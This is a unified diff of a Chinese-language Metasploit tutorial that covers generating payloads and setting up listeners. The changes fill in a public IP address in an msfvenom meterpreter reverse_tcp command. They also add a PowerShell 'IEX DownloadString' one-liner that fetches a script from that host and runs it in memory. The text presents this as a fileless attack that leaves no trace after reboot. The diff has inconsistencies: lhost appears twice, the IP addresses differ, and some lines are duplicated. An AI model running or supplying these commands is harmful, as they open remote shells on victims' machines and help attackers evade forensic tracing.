@@ -144,7 +144,7 @@ k. 其余参数可用 -h 查看
 lport=<port> -f exe -o payload.exe
 ~~~~
 
-**建立监听**
+## **建立监听**
 
 ~~~~markdown
 1. 常规监听
@@ -240,17 +240,18 @@ powershell  必须加/x64/
 想建立会话的同时不想在服务器留文件，可以用无文件攻击，通过命令远程加
 载代码到内存运行，一旦重启无法溯源。
 具体操作：
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost= lhost=1234 -f psh-reflection > x.ps1
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=148.28.27.106 lhost=1234 -f psh-reflection > x.ps1
 （这一步生成ps脚本文件）
 启用vps，搭建网站，把文件放在网站目录里，通过对外部文件的访问来
+http://149.28.27.106/x.ps1
 进行调用，如vps的ip为192.168.8.1
 建立侦听
 在目标机的命令行输入：powershell IEX (New-Object 
-Net.Webclient).DownloadString('http://192.168.8.1/x.ps1')，运行
+Net.Webclient).DownloadString('http://149.28.27.106/x.ps1')，运行
 进行调用，如vps的ip为192.168.8.1
 建立侦听
 在目标机的命令行输入：powershell IEX (New-Object 
-Net.Webclient).DownloadString('http://192.168.8.1/x.ps1')，运行
+Net.Webclient).DownloadString('http://149.28.27.106/x.ps1')，运行
 建立连接
 ~~~~
 
